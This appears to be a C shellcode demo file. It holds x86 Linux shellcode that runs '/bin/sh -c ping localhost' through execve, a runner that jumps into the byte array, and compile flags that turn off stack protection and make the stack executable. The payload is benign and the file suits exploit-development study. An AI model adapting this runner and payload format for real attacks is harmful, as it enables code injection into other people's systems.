#include<stdio.h>
#include<string.h>

/* 
Compilation and execution : gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
Usage : ./shellcode
*/

unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
			    "\x89\xe3\x50\x68\x68\x6f\x73\x74\x68\x6f\x63\x61\x6c"
			    "\x68\x6e\x67\x20\x6c\x66\x68\x70\x69\x89\xe6\x50\x66"
			    "\x68\x2d\x63\x89\xe1\x50\x56\x51\x53\x89\xe1\x50\x89"
			    "\xe2\xb0\x0b\xcd\x80";

main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();	
}
